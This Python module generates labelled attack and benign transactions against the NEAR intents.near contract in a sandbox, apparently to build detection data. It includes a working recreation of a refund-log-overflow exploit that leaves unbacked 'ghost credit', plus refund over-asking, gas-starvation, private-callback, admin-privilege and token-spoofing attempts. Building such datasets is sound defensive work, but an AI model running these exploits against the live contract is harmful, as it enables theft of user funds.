"""Attack and benign transaction scenarios, run against intents.near in a sandbox.

Each scenario sends one subject transaction (plus untracked setup transactions) and returns it with labels. Ground
truth for the deposit-Notify attacks comes from contract state, not from the transaction status: `ghost_credit` is the
credit intents.near kept for the receiver minus the tokens intents.near actually holds for it on the token contract.
"""

from __future__ import annotations

import base64
import hashlib
import json
import random
import string
from dataclasses import dataclass, field

from near.intents.synthetic import nearkeys
from near.intents.synthetic.sandbox import NEAR, Account
from near.intents.synthetic.world import World

U128_MAX = 2**128 - 1
OMNI_PREFIX = "nep245:omni.bridge.near:"
USDT_ID = "nep141:usdt.bridge.near"


@dataclass
class Result:
    status: dict
    label: str  # "attack" | "benign"
    family: str
    variant: dict
    outcome: dict = field(default_factory=dict)
    role: str = ""  # exploit | attempt | benign


@dataclass
class Actors:
    """Per-worker accounts. Token ids are per worker, so state deltas can be attributed to one transaction."""

    worker: int
    attacker: Account
    user: Account
    user2: Account
    receivers: list[Account]
    main_token: str
    dust_tokens: list[str]
    user_tokens: list[str]
    dust_generation: dict[tuple[str, int], tuple[int, int]] = field(default_factory=dict)


def _rand_id(rng: random.Random, length: int, prefix: str) -> str:
    alphabet = string.ascii_letters + string.digits
    return (prefix + "".join(rng.choice(alphabet) for _ in range(length)))[:length]


def make_actors(world: World, worker: int, rng: random.Random) -> Actors:
    attacker = world.new_implicit(f"w{worker}-attacker", 200 * NEAR)
    user = world.new_implicit(f"w{worker}-user", 200 * NEAR)
    user2 = world.new_implicit(f"w{worker}-user2", 50 * NEAR)
    receivers = [world.new_receiver(f"w{worker}-receiver{i}") for i in range(3)]
    main = f"{4444100 + worker}_usdt_bsc_{worker}"
    # dust ids up to the 127-char limit, like the exploit's 101-char id
    # the first dust id is always long (the exploit's was 101 chars); the others vary
    lengths = [rng.choice([101, 115, 127]), rng.choice([60, 80, 101, 127]), rng.choice([60, 80, 101, 127])]
    dust = [_rand_id(rng, n, f"{4444200 + worker}_{i}_") for i, n in enumerate(lengths)]
    user_tokens = [f"{4444300 + worker}_{sym}" for sym in ("eth", "btc", "sol", "usdc", "doge", "trx", "ton",
                                                             "xrp", "ada", "bnb")]
    for acc in (attacker, user):
        world.mint_on_omni(acc.account_id, [main] + user_tokens, [10**30] * (1 + len(user_tokens)))
    world.give_usdt(user.account_id, 10**27)
    world.give_usdt(attacker.account_id, 10**27)
    world.give_usdt(user2.account_id, 10**24)
    return Actors(worker, attacker, user, user2, receivers, main, dust, user_tokens)


# ---------------------------------------------------------------------------------------------------------------------
# state helpers
# ---------------------------------------------------------------------------------------------------------------------


def intents_balance(world: World, owner: str, token_ids: list[str]) -> list[int]:
    return [int(x) for x in world.chain.view(world.intents_id, "mt_batch_balance_of",
                                             {"account_id": owner, "token_ids": token_ids})]


def omni_balance(world: World, owner: str, token_ids: list[str]) -> list[int]:
    return [int(x) for x in world.chain.view(world.omni.account_id, "mt_batch_balance_of",
                                             {"account_id": owner, "token_ids": token_ids})]


def receipt_failures(status: dict) -> list[str]:
    out = []
    for ro in status["receipts_outcome"]:
        st = ro["outcome"]["status"]
        if isinstance(st, dict) and "Failure" in st:
            out.append(json.dumps(st["Failure"])[:300])
    return out


def resolve_failed(status: dict) -> bool:
    receipts = {r["receipt_id"]: r for r in status.get("receipts", [])}
    for ro in status["receipts_outcome"]:
        st = ro["outcome"]["status"]
        if not (isinstance(st, dict) and "Failure" in st):
            continue
        view = receipts.get(ro["id"], {})
        for a in view.get("receipt", {}).get("Action", {}).get("actions", []):
            if isinstance(a, dict) and "FunctionCall" in a and "_resolve_" in a["FunctionCall"]["method_name"]:
                return True
    return False


def _notify_msg(receiver_id: str, mode, min_gas_tgas: int | None) -> str:
    msg = {"receiver_id": receiver_id, "msg": json.dumps(mode)}
    if min_gas_tgas is not None:
        msg["min_gas"] = str(min_gas_tgas * 10**12)
    return json.dumps(msg)


def receiver_dust(world: World, a: Actors, receiver: Account, i: int, need: int) -> str:
    """Setup: make the receiver hold >= `need` of a worthless dust token inside intents.near; return its id.

    Dust ids are per (receiver, i) and rotate to a fresh id ("generation") before any u128 balance could overflow.
    """
    ridx = a.receivers.index(receiver)
    base = a.dust_tokens[i]
    key = (receiver.account_id, i)
    gen, cumulative = a.dust_generation.get(key, (0, 0))
    dust_id = (f"{ridx}g{gen}_" + base)[: len(base)]
    held = intents_balance(world, receiver.account_id, [OMNI_PREFIX + dust_id])[0]
    if held >= need:
        return dust_id
    top_up = need - held + 10**36
    if cumulative + top_up > 33 * 10**37:
        gen, cumulative = gen + 1, 0
        dust_id = (f"{ridx}g{gen}_" + base)[: len(base)]
        top_up = need + 10**36
    # the extra stays with the attacker, for the dust entries of later deposits
    world.mint_on_omni(a.attacker.account_id, [dust_id], [top_up + 10**15])
    st = a.attacker.call(world.omni.account_id, "mt_transfer_call", {
        "receiver_id": world.intents_id, "token_id": dust_id, "amount": str(top_up),
        "msg": receiver.account_id}, deposit=1, gas_tgas=100)
    if receipt_failures(st):
        raise RuntimeError(f"dust setup failed: {receipt_failures(st)}")
    a.dust_generation[key] = (gen, cumulative + top_up)
    return dust_id


def _mt_deposit_with_ghost_check(world: World, a: Actors, sender: Account, receiver: Account, token_ids: list[str],
                                 amounts: list[int], msg: str, gas_tgas: int = 300) -> tuple[dict, dict]:
    """Send omni.mt_batch_transfer_call into intents.near and measure the credit intents kept without backing."""
    main = a.main_token
    credit_before = intents_balance(world, receiver.account_id, [OMNI_PREFIX + main])[0]
    backing_before = omni_balance(world, world.intents_id, [main])[0]
    sender_before = omni_balance(world, sender.account_id, [main])[0]
    st = sender.call(world.omni.account_id, "mt_batch_transfer_call", {
        "receiver_id": world.intents_id, "token_ids": token_ids, "amounts": [str(x) for x in amounts],
        "msg": msg}, deposit=1, gas_tgas=gas_tgas)
    credit_after = intents_balance(world, receiver.account_id, [OMNI_PREFIX + main])[0]
    backing_after = omni_balance(world, world.intents_id, [main])[0]
    sender_after = omni_balance(world, sender.account_id, [main])[0]
    credit_delta = credit_after - credit_before
    backing_delta = backing_after - backing_before
    deposited_main = sum(x for t, x in zip(token_ids, amounts) if t == main)
    outcome = {
        "main_deposited": str(deposited_main),
        "credit_delta": str(credit_delta),
        "backing_delta": str(backing_delta),
        "sender_refunded": str(sender_after - sender_before + deposited_main),
        "ghost_credit": str(max(0, credit_delta - backing_delta)),
        "unbacked_burn": str(max(0, backing_delta - credit_delta)),
        "resolve_failed": resolve_failed(st),
        "failures": receipt_failures(st),
    }
    return st, outcome


LOG_LIMIT = 16384


def event_log_len(event: str, owner_id: str, token_ids: list[str], amounts: list[int], memo: str | None) -> int:
    """Length of the NEP-245 `EVENT_JSON:` log intents.near emits for a mint or burn (serde_json compact)."""
    data = {"owner_id": owner_id, "token_ids": token_ids, "amounts": [str(x) for x in amounts]}
    if memo is not None:
        data["memo"] = memo
    body = {"standard": "nep245", "version": "1.0.0", "event": event, "data": [data]}
    return len("EVENT_JSON:" + json.dumps(body, separators=(",", ":")))


def _role(outcome: dict) -> str:
    return "exploit" if int(outcome.get("ghost_credit", "0")) > 0 else "attempt"


# ---------------------------------------------------------------------------------------------------------------------
# attack families
# ---------------------------------------------------------------------------------------------------------------------


def attack_notify_log_overflow(world: World, a: Actors, rng: random.Random) -> Result:
    """The 2026-10-01 exploit: dust-padded Notify deposit whose over-asked refund makes the resolve's burn log overflow.

    The burn log lists one entry per dust entry with the requested refund, so it outgrows the mint log (amount "1");
    the resolve panics, intents.near keeps the credit, and the token refunds the sender in full.
    """
    receiver = rng.choice(a.receivers)
    n_distinct = rng.choice([1, 1, 1, 2, 3])
    main_amount = int(rng.choice([1, 2, 5, 8, 16, 32, 64, 128]) * 10 ** rng.randint(17, 24))
    dust_amount = rng.choice([1, 1, 1, 2, 10])
    refund_target = int(rng.choice([1, 2, 3, 5]) * 10 ** rng.randint(29, 36))
    dust_lens = [len(d) for d in a.dust_tokens[:n_distinct]]
    # sample the entry count around the point where the burn log (refund amounts) passes the log limit while the
    # mint log (deposit amounts) still fits: ~70% over the limit, the rest near misses with the same shape
    max_entries = 104  # more entries exceed the sandbox's 300 TGas per transaction
    sizes = {}
    for n in range(20, max_entries + 1):
        refund_each = min(refund_target, (25 * 10**37) // n)
        ids = [OMNI_PREFIX + "d" * dust_lens[i % n_distinct] for i in range(n)] + [OMNI_PREFIX + a.main_token]
        sizes[n] = (event_log_len("mt_mint", receiver.account_id, ids, [dust_amount] * n + [main_amount], "deposit"),
                    event_log_len("mt_burn", receiver.account_id, ids, [refund_each] * n + [main_amount], "refund"),
                    refund_each)
    overflowing = [n for n, (m, b, _) in sizes.items() if b > LOG_LIMIT and m <= LOG_LIMIT]
    if overflowing and rng.random() < 0.7:
        n_dust = rng.choice(overflowing[:15])
    elif overflowing:
        n_dust = rng.randint(max(20, overflowing[0] - 25), overflowing[0] - 1)
    else:
        n_dust = rng.randint(60, max_entries)
    predicted_mint, predicted_burn, refund_each = sizes[n_dust]
    dust_ids = [receiver_dust(world, a, receiver, i, refund_each * n_dust + 1) for i in range(n_distinct)]
    dust_entries = [dust_ids[i % n_distinct] for i in range(n_dust)]
    order = rng.choice(["dust_first", "dust_first", "main_first", "interleaved"])
    if order == "dust_first":
        token_ids = dust_entries + [a.main_token]
    elif order == "main_first":
        token_ids = [a.main_token] + dust_entries
    else:
        pos = rng.randint(0, n_dust)
        token_ids = dust_entries[:pos] + [a.main_token] + dust_entries[pos:]
    amounts = [main_amount if t == a.main_token else dust_amount for t in token_ids]
    mode_kind = rng.choice(["ReturnValue", "ReturnValues"])
    mode = ({"ReturnValue": str(refund_each)} if mode_kind == "ReturnValue"
            else {"ReturnValues": [str(refund_each)] * len(token_ids)})
    min_gas = rng.choice([None, None, 5, 10, 30])
    st, outcome = _mt_deposit_with_ghost_check(world, a, a.attacker, receiver, token_ids, amounts,
                                               _notify_msg(receiver.account_id, mode, min_gas))
    variant = {"n_entries": len(token_ids), "n_dust": n_dust, "n_distinct_dust": n_distinct,
               "dust_id_len": [len(d) for d in dust_ids], "refund_each": str(refund_each),
               "main_amount": str(main_amount), "order": order, "receiver_mode": mode_kind,
               "notify_min_gas_tgas": min_gas, "path": "token.mt_batch_transfer_call",
               "dust_amount": dust_amount, "predicted_mint_log": predicted_mint,
               "predicted_burn_log": predicted_burn}
    return Result(st, "attack", "notify_refund_log_overflow", variant, outcome, _role(outcome))


def attack_notify_overask(world: World, a: Actors, rng: random.Random) -> Result:
    """Notify receiver asks for more refund than deposited, on a small batch (no log overflow)."""
    receiver = rng.choice(a.receivers)
    n = rng.randint(1, 10)
    with_dust = rng.random() < 0.5
    dust_id = receiver_dust(world, a, receiver, 0, 10**37) if with_dust else ""
    token_ids = [a.main_token] + ([dust_id] * (n - 1) if with_dust else a.user_tokens[: n - 1])
    amounts = [int(rng.choice([1, 3, 7]) * 10 ** rng.randint(15, 23)) if i == 0 else rng.choice([1, 10, 100])
               for i in range(n)]
    kind = rng.choice(["MaliciousRefund", "ReturnValue", "ReturnValues"])
    if kind == "MaliciousRefund":
        mode = "MaliciousRefund"
    elif kind == "ReturnValue":
        mode = {"ReturnValue": str(int(10 ** rng.uniform(24, 38)))}
    else:
        mode = {"ReturnValues": [str(x * rng.choice([2, 10, 1000])) for x in amounts]}
    st, outcome = _mt_deposit_with_ghost_check(world, a, a.attacker, receiver, token_ids, amounts,
                                               _notify_msg(receiver.account_id, mode, rng.choice([None, 5, 30])))
    variant = {"n_entries": n, "with_dust": with_dust, "receiver_mode": kind, "path": "token.mt_batch_transfer_call"}
    return Result(st, "attack", "notify_refund_overask", variant, outcome, _role(outcome))


def attack_notify_receiver_failure(world: World, a: Actors, rng: random.Random) -> Result:
    """Notify to a receiver that panics or returns an oversized value, trying to break the resolve callback."""
    receiver = rng.choice(a.receivers)
    n = rng.randint(1, 10)
    token_ids = [a.main_token] + a.user_tokens[: n - 1]
    amounts = [int(10 ** rng.uniform(15, 23)) for _ in range(n)]
    kind = rng.choice(["Panic", "LargeReturn", "ReturnBytes", "ReturnValuesWrongLen"])
    if kind == "ReturnBytes":
        mode = {"ReturnBytes": str(rng.choice([100_000, 1_000_000, 3 * 1024 * 1024]))}
    elif kind == "ReturnValuesWrongLen":
        mode = {"ReturnValues": [str(10**30)] * (n + rng.randint(1, 50))}
    else:
        mode = kind
    min_gas = rng.choice([None, 5, 50, 150, 250])
    st, outcome = _mt_deposit_with_ghost_check(world, a, a.attacker, receiver, token_ids, amounts,
                                               _notify_msg(receiver.account_id, mode, min_gas))
    variant = {"n_entries": n, "receiver_mode": kind, "notify_min_gas_tgas": min_gas,
               "path": "token.mt_batch_transfer_call"}
    return Result(st, "attack", "notify_receiver_failure", variant, outcome, _role(outcome))


def attack_callback_low_gas(world: World, a: Actors, rng: random.Random) -> Result:
    """Notify deposit with too little gas for the callback chain (the April out-of-gas attempts)."""
    receiver = rng.choice(a.receivers)
    n = rng.randint(1, 60)
    token_ids = [a.main_token] + [a.user_tokens[i % len(a.user_tokens)] for i in range(n - 1)]
    amounts = [int(10 ** rng.uniform(15, 22)) for _ in range(n)]
    gas = rng.choice([20, 30, 40, 60, 80, 100, 150])
    min_gas = rng.choice([None, 5, 100, 200, 280])
    mode = rng.choice(["AcceptAll", "RefundAll", "MaliciousRefund"])
    st, outcome = _mt_deposit_with_ghost_check(world, a, a.attacker, receiver, token_ids, amounts,
                                               _notify_msg(receiver.account_id, mode, min_gas), gas_tgas=gas)
    variant = {"n_entries": n, "tx_gas_tgas": gas, "notify_min_gas_tgas": min_gas, "receiver_mode": mode,
               "path": "token.mt_batch_transfer_call"}
    return Result(st, "attack", "callback_low_gas", variant, outcome, _role(outcome))


PRIVATE_METHODS = ["mt_resolve_deposit", "ft_resolve_deposit", "nft_resolve_deposit", "mt_resolve_withdraw",
                   "ft_resolve_withdraw", "mt_resolve_transfer"]


def attack_direct_private_call(world: World, a: Actors, rng: random.Random) -> Result:
    """A signer calls a private callback (`*_resolve_*`) on intents.near directly."""
    method = rng.choice(PRIVATE_METHODS)
    receiver = rng.choice(a.receivers).account_id
    amount = str(int(10 ** rng.uniform(18, 30)))
    args = {
        "mt_resolve_deposit": {"receiver_id": receiver, "contract_id": world.omni.account_id,
                               "tokens": [a.main_token], "amounts": [amount]},
        "ft_resolve_deposit": {"receiver_id": receiver, "contract_id": world.usdt.account_id, "amount": amount},
        "nft_resolve_deposit": {"receiver_id": receiver, "contract_id": "nft.near", "token_id": "1"},
        "mt_resolve_withdraw": {"token": world.omni.account_id, "sender_id": a.attacker.account_id,
                                "token_ids": [a.main_token], "amounts": [amount], "is_call": False},
        "ft_resolve_withdraw": {"token": world.usdt.account_id, "sender_id": a.attacker.account_id,
                                "amount": amount, "is_call": False},
        "mt_resolve_transfer": {"previous_owner_ids": [receiver], "receiver_id": a.attacker.account_id,
                                "token_ids": [USDT_ID], "amounts": [amount]},
    }[method]
    st = a.attacker.call(world.intents_id, method, args, gas_tgas=rng.choice([30, 100, 300]))
    outcome = {"failures": receipt_failures(st)}
    return Result(st, "attack", "direct_private_call", {"method": method}, outcome, "attempt")


ADMIN_CALLS = [
    ("upgrade", lambda a: {"code": base64.b64encode(b"\0asm\1\0\0\0").decode()}, 1),
    ("acl_grant_role", lambda a: {"role": "DAO", "account_id": a.attacker.account_id}, 0),
    ("acl_add_super_admin", lambda a: {"account_id": a.attacker.account_id}, 0),
    ("pa_pause_feature", lambda a: {"key": "ALL"}, 0),
    ("set_fee", lambda a: {"fee": 1000}, 1),
    ("set_fee_collector", lambda a: {"fee_collector": a.attacker.account_id}, 1),
    ("add_relayer_key", lambda a: {"public_key": a.attacker.key.public_key_str}, 1),
    ("add_full_access_key", lambda a: {"public_key": a.attacker.key.public_key_str}, 1),
    ("ft_force_withdraw", lambda a: {"owner_id": a.user.account_id, "token": "usdt.bridge.near",
                                     "receiver_id": a.attacker.account_id, "amount": "1000"}, 1),
    ("mt_force_transfer", lambda a: {"owner_id": a.user.account_id, "receiver_id": a.attacker.account_id,
                                     "token_id": USDT_ID, "amount": "1000"}, 1),
    ("force_lock_account", lambda a: {"account_id": a.user.account_id}, 1),
    ("force_add_public_keys", lambda a: {"public_keys": {a.user.account_id: [a.attacker.key.public_key_str]}}, 1),
    ("invalidate_salts", lambda a: {"salts": ["00000000"]}, 1),
    ("cleanup_nonces", lambda a: {"nonces": []}, 0),
]


def attack_admin_probe(world: World, a: Actors, rng: random.Random) -> Result:
    """A non-role account calls admin / role-gated methods (the May fuzzing pattern)."""
    method, make_args, deposit = rng.choice(ADMIN_CALLS)
    st = a.attacker.call(world.intents_id, method, make_args(a), gas_tgas=rng.choice([30, 100, 300]),
                         deposit=deposit)
    outcome = {"failures": receipt_failures(st)}
    return Result(st, "attack", "admin_probe", {"method": method}, outcome, "attempt")


def attack_token_spoof(world: World, a: Actors, rng: random.Random) -> Result:
    """A signer calls intents.near's `mt_on_transfer` / `ft_on_transfer` itself, posing as a token contract."""
    receiver = rng.choice(a.receivers)
    kind = rng.choice(["ft_on_transfer", "mt_on_transfer", "mt_on_transfer_notify_overflow"])
    if kind == "ft_on_transfer":
        args = {"sender_id": rng.choice([a.attacker.account_id, "usdt.bridge.near"]),
                "amount": str(int(10 ** rng.uniform(18, 30))),
                "msg": rng.choice(["", receiver.account_id, _notify_msg(receiver.account_id, "AcceptAll", None)])}
        variant = {"method": kind}
    elif kind == "mt_on_transfer":
        n = rng.randint(1, 10)
        ids = [f"{a.main_token}_spoof{i}" for i in range(n)]
        args = {"sender_id": a.attacker.account_id, "previous_owner_ids": [a.attacker.account_id] * n,
                "token_ids": ids, "amounts": [str(int(10 ** rng.uniform(18, 30))) for _ in ids],
                "msg": rng.choice(["", receiver.account_id])}
        variant = {"method": kind, "n_entries": n}
    else:
        n = rng.randint(80, 110)
        dust = a.dust_tokens[0][:100]
        ids = [dust] * n + [f"{a.main_token}_spoof"]
        args = {"sender_id": a.attacker.account_id, "previous_owner_ids": [a.attacker.account_id] * (n + 1),
                "token_ids": ids, "amounts": ["1"] * n + [str(10**24)],
                "msg": _notify_msg(receiver.account_id, {"ReturnValue": str(10**36)}, None)}
        variant = {"method": "mt_on_transfer", "n_entries": n + 1, "payload": "log_overflow_notify"}
    st = a.attacker.call(world.intents_id, kind.split("_notify")[0], args, gas_tgas=300)
    outcome = {"failures": receipt_failures(st), "resolve_failed": resolve_failed(st)}
    return Result(st, "attack", "token_spoof_direct_on_transfer", variant, outcome, "attempt")


ATTACKS = {
    "notify_refund_log_overflow": (attack_notify_log_overflow, 0.45),
    "notify_refund_overask": (attack_notify_overask, 0.12),
    "notify_receiver_failure": (attack_notify_receiver_failure, 0.10),
    "callback_low_gas": (attack_callback_low_gas, 0.10),
    "direct_private_call": (attack_direct_private_call, 0.07),
    "admin_probe": (attack_admin_probe, 0.08),
    "token_spoof_direct_on_transfer": (attack_token_spoof, 0.08),
}


# ---------------------------------------------------------------------------------------------------------------------
# benign families
# ---------------------------------------------------------------------------------------------------------------------


def benign_mt_deposit(world: World, a: Actors, rng: random.Random) -> Result:
    n = rng.choice([1, 1, 1, 1, 2, 2, 3, 5, 10])
    toks = rng.sample([a.main_token] + a.user_tokens, n)
    amounts = [int(rng.choice([1, 2, 5, 25, 99]) * 10 ** rng.randint(6, 24)) for _ in toks]
    target = rng.choice([a.user, a.user2])
    msg = rng.choice(["", target.account_id, json.dumps({"receiver_id": target.account_id})])
    if n == 1 and rng.random() < 0.3:
        method = "mt_transfer_call"
        args = {"receiver_id": world.intents_id, "token_id": toks[0], "amount": str(amounts[0]), "msg": msg}
    else:
        method = "mt_batch_transfer_call"
        args = {"receiver_id": world.intents_id, "token_ids": toks, "amounts": [str(x) for x in amounts], "msg": msg}
    st = a.user.call(world.omni.account_id, method, args, deposit=1, gas_tgas=rng.choice([100, 200, 300]))
    return Result(st, "benign", "mt_deposit", {"n_entries": n, "msg_kind": _msg_kind(msg), "method": method},
                  {"failures": receipt_failures(st)}, "benign")


def _msg_kind(msg: str) -> str:
    if not msg:
        return "empty"
    return "json" if msg.startswith("{") else "account_id"


def benign_mt_deposit_notify(world: World, a: Actors, rng: random.Random) -> Result:
    """Notify deposits whose receiver behaves: accepts, refunds exactly, or refunds part."""
    receiver = rng.choice(a.receivers)
    n = rng.choice([1, 1, 1, 2, 3, 5, 10])
    toks = rng.sample([a.main_token] + a.user_tokens, n)
    amounts = [int(rng.choice([1, 3, 10, 50]) * 10 ** rng.randint(6, 24)) for _ in toks]
    kind = rng.choice(["AcceptAll", "AcceptAll", "RefundAll", "ReturnValues", "ReturnValue0"])
    if kind == "ReturnValues":
        mode = {"ReturnValues": [str(rng.randint(0, x)) for x in amounts]}
    elif kind == "ReturnValue0":
        mode = {"ReturnValue": "0"}
    else:
        mode = kind
    st, outcome = _mt_deposit_with_ghost_check(world, a, a.user, receiver, toks, amounts,
                                               _notify_msg(receiver.account_id, mode,
                                                           rng.choice([None, None, 5, 10, 30])),
                                               gas_tgas=rng.choice([150, 300]))
    return Result(st, "benign", "mt_deposit_notify", {"n_entries": n, "receiver_mode": kind}, outcome, "benign")


def benign_ft_deposit(world: World, a: Actors, rng: random.Random) -> Result:
    amount = int(rng.choice([1, 2, 5, 10, 20, 50]) * 10 ** rng.randint(4, 22))
    target = rng.choice([a.user, a.user2])
    kind = rng.choice(["empty", "account_id", "json", "notify"])
    receiver = rng.choice(a.receivers)
    msg = {"empty": "", "account_id": target.account_id, "json": json.dumps({"receiver_id": target.account_id}),
           "notify": _notify_msg(receiver.account_id, rng.choice(["AcceptAll", "RefundAll"]), None)}[kind]
    st = a.user.call(world.usdt.account_id, "ft_transfer_call",
                     {"receiver_id": world.intents_id, "amount": str(amount), "msg": msg},
                     deposit=1, gas_tgas=rng.choice([50, 100, 300]))
    return Result(st, "benign", "ft_deposit", {"msg_kind": kind}, {"failures": receipt_failures(st)}, "benign")


def benign_wnear_deposit(world: World, a: Actors, rng: random.Random) -> Result:
    """near_deposit + ft_transfer_call in one transaction, as wallets do for NEAR deposits."""
    amount = int(rng.choice([1, 2, 5]) * 10 ** rng.randint(22, 24))
    actions = [
        nearkeys.function_call("near_deposit", b"{}", 10 * 10**12, amount),
        # wrap.near keeps the storage fee out of the first deposit, so send a little less than was wrapped
        nearkeys.function_call("ft_transfer_call", json.dumps({"receiver_id": world.intents_id,
                                                               "amount": str(amount - 1_250_000_000_000_000_000_000),
                                                               "msg": rng.choice(["", a.user.account_id])}).encode(),
                               100 * 10**12, 1),
    ]
    if rng.random() < 0.5:
        actions.insert(0, nearkeys.function_call("storage_deposit", json.dumps({}).encode(), 10 * 10**12,
                                                 1_250_000_000_000_000_000_000))
    st = a.user.send(world.wrap.account_id, actions)
    return Result(st, "benign", "wnear_deposit", {"n_actions": len(actions)}, {"failures": receipt_failures(st)},
                  "benign")


def benign_ft_withdraw(world: World, a: Actors, rng: random.Random) -> Result:
    bal = intents_balance(world, a.user.account_id, [USDT_ID])[0]
    amount = max(1, int(bal * rng.uniform(0.001, 0.2)))
    target = rng.choice([a.user, a.user2])
    st = a.user.call(world.intents_id, "ft_withdraw", {"token": world.usdt.account_id,
                                                       "receiver_id": target.account_id, "amount": str(amount)},
                     deposit=1, gas_tgas=rng.choice([50, 100, 300]))
    return Result(st, "benign", "ft_withdraw", {"has_balance": bal > 0}, {"failures": receipt_failures(st)},
                  "benign")


def benign_mt_withdraw(world: World, a: Actors, rng: random.Random) -> Result:
    n = rng.choice([1, 1, 2, 3])
    toks = rng.sample(a.user_tokens, n)
    bals = intents_balance(world, a.user.account_id, [OMNI_PREFIX + t for t in toks])
    amounts = [max(1, int(b * rng.uniform(0.01, 0.5))) for b in bals]
    st = a.user.call(world.intents_id, "mt_withdraw", {
        "token": world.omni.account_id, "receiver_id": a.user.account_id, "token_ids": toks,
        "amounts": [str(x) for x in amounts]}, deposit=1, gas_tgas=rng.choice([100, 300]))
    return Result(st, "benign", "mt_withdraw", {"n_entries": n}, {"failures": receipt_failures(st)}, "benign")


def benign_intents_mt_transfer(world: World, a: Actors, rng: random.Random) -> Result:
    """Plain NEP-245 transfer of intents.near balances between users (mt_transfer on the verifier)."""
    tok = rng.choice([USDT_ID] + [OMNI_PREFIX + t for t in a.user_tokens[:3]])
    bal = intents_balance(world, a.user.account_id, [tok])[0]
    amount = max(1, int(bal * rng.uniform(0.001, 0.1)))
    st = a.user.call(world.intents_id, "mt_transfer", {"receiver_id": a.user2.account_id, "token_id": tok,
                                                       "amount": str(amount)}, deposit=1, gas_tgas=30)
    return Result(st, "benign", "intents_mt_transfer", {}, {"failures": receipt_failures(st)}, "benign")


def _signed_intents(world: World, signer: Account, intents: list[dict], rng: random.Random) -> dict:
    message = json.dumps({"signer_id": signer.account_id, "deadline": "2030-01-01T00:00:00Z", "intents": intents})
    nonce = bytes(rng.getrandbits(8) for _ in range(32))
    recipient = world.intents_id
    tag = (2**31 + 413).to_bytes(4, "little")
    prehash = (tag + len(message.encode()).to_bytes(4, "little") + message.encode() + nonce
               + len(recipient).to_bytes(4, "little") + recipient.encode() + b"\x00")
    sig = nearkeys.ed25519_sign(signer.key.seed, hashlib.sha256(prehash).digest())
    return {"standard": "nep413",
            "payload": {"message": message, "nonce": base64.b64encode(nonce).decode(), "recipient": recipient},
            "public_key": signer.key.public_key_str, "signature": "ed25519:" + nearkeys.b58encode(sig)}


def benign_execute_intents(world: World, a: Actors, rng: random.Random, relayer: Account) -> Result:
    """A relayer submits a user's NEP-413-signed intents: transfers, or a withdrawal to the user's wallet."""
    tok = rng.choice([USDT_ID] + [OMNI_PREFIX + t for t in a.user_tokens[:3]])
    bal = intents_balance(world, a.user.account_id, [tok])[0]
    amount = max(1, int(bal * rng.uniform(0.001, 0.05)))
    kind = rng.choice(["transfer", "transfer", "ft_withdraw", "multi_transfer"])
    if kind == "transfer" or tok != USDT_ID and kind == "ft_withdraw":
        kind = "transfer"
        intents = [{"intent": "transfer", "receiver_id": a.user2.account_id, "tokens": {tok: str(amount)}}]
    elif kind == "ft_withdraw":
        intents = [{"intent": "ft_withdraw", "token": world.usdt.account_id, "receiver_id": a.user.account_id,
                    "amount": str(amount)}]
    else:
        intents = [{"intent": "transfer", "receiver_id": r.account_id, "tokens": {tok: str(max(1, amount // 3))}}
                   for r in (a.user2, a.attacker)]
    payloads = [_signed_intents(world, a.user, intents, rng)]
    st = relayer.call(world.intents_id, "execute_intents", {"signed": payloads}, gas_tgas=rng.choice([100, 300]))
    return Result(st, "benign", "execute_intents", {"intent_kind": kind}, {"failures": receipt_failures(st)},
                  "benign")


BENIGN = {
    "mt_deposit": (benign_mt_deposit, 0.18),
    "mt_deposit_notify": (benign_mt_deposit_notify, 0.16),
    "ft_deposit": (benign_ft_deposit, 0.14),
    "wnear_deposit": (benign_wnear_deposit, 0.06),
    "ft_withdraw": (benign_ft_withdraw, 0.10),
    "mt_withdraw": (benign_mt_withdraw, 0.08),
    "intents_mt_transfer": (benign_intents_mt_transfer, 0.08),
    "execute_intents": (benign_execute_intents, 0.20),
}
